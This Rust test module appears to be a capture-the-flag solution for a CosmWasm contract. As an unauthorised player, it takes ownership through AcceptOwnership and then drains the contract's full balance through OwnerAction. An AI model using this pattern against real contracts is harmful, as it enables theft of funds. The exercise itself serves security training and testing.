#[cfg(test)]
pub mod exploit {
    use crate::{
        contract::DENOM,
        integration_tests::tests::{base_scenario, PLAYER},
        msg::ExecuteMsg,
    };
    use cosmwasm_std::{Addr, BankMsg, CosmosMsg, Uint128};
    use cw_multi_test::Executor;

    #[test]
    fn exploit() {
        let (mut app, contract_addr) = base_scenario();

        let player = Addr::unchecked(PLAYER);

        let initial_contract_balance = app
            .wrap()
            .query_balance(contract_addr.to_string(), DENOM)
            .unwrap();

        app.execute_contract(
            player.clone(),
            contract_addr.clone(),
            &ExecuteMsg::AcceptOwnership {},
            &[],
        )
        .unwrap();

        let msg = CosmosMsg::Bank(BankMsg::Send {
            to_address: player.to_string(),
            amount: vec![initial_contract_balance],
        });

        app.execute_contract(
            player,
            contract_addr.clone(),
            &ExecuteMsg::OwnerAction { msg },
            &[],
        )
        .unwrap();

        assert_eq!(
            app.wrap()
                .query_balance(contract_addr.to_string(), DENOM)
                .unwrap()
                .amount,
            Uint128::zero()
        )
    }
}
